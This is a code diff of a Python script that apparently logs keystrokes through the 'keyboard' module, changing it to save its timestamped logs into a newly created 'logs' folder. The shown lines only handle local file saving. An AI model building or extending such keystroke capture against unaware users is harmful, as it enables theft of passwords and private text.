@@ -2,6 +2,7 @@ import keyboard
 import threading
 import time
 from datetime import datetime
+import os
 
 global_log = ""
 log_lock = threading.Lock() 
@@ -40,7 +41,10 @@ def repeat_saves():
             global global_log
             if global_log:
                 current_time = datetime.now().strftime("%Y-%m-%d %H-%M-%S")
-                with open(current_time+'.txt', 'a') as file:
+                new_folder = 'logs'
+                if not os.path.exists(new_folder):
+                    os.makedirs(new_folder)
+                with open('logs/'+current_time+'.txt', 'a') as file:
                     file.write(global_log)
                 global_log = ''
 
